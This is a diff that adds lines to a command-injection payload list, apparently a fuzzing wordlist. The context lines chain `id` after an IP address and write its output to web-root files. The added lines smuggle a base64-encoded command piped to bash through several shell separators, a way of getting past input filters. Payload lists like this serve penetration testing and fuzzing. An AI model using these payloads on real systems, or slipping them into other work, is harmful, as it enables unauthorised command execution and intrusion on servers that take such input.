@@ -140,3 +140,12 @@ www.nsa.gov&& www.google.com
 127.0.0.1&&id > /var/www/id4.txt
 127.0.0.1%0aid > /var/www/html/id5.txt
 127.0.0.1%0aid > /var/www/id5.txt
+;echo "aWQK"|base64 -d|bash
+|echo "aWQK"|base64 -d|bash
+&echo "aWQK"|base64 -d|bash
+%0aecho "aWQK"|base64 -d|bash
+127.0.0.1;echo "aWQK"|base64 -d|bash
+127.0.0.1|echo "aWQK"|base64 -d|bash
+127.0.0.1&echo "aWQK"|base64 -d|bash
+127.0.0.1&&echo "aWQK"|base64 -d|bash
+127.0.0.1%0aecho "aWQK"|base64 -d|bash
